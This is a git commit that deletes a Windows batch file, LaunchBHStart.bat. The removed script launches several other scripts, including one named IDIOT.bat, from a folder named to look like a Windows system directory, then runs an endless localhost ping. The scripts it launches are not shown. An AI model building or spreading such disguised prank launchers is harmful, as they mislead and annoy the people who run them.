a00c46577ebbb99156f87412ccf692e83c38a695
CloudDown <81918345+CloudDown@users.noreply.github.com>
2021-06-20 11:19:14 +0200

    Delete LaunchBHStart.bat

--- LaunchBHStart.bat
+++
@@ -1,8 +0,0 @@
-@echo off
-color 4
-start C:\WindowsSystem\cSync\IDIOT.bat
-start C:\WindowsSystem\cSync\IDIOT.bat
-start C:\WindowsSystem\cSync\IDIOT.bat
-timeout 3
-start C:\WindowsSystem\cSync\launchBH1.bat
-ping localhost /w 1 /t /l 6500
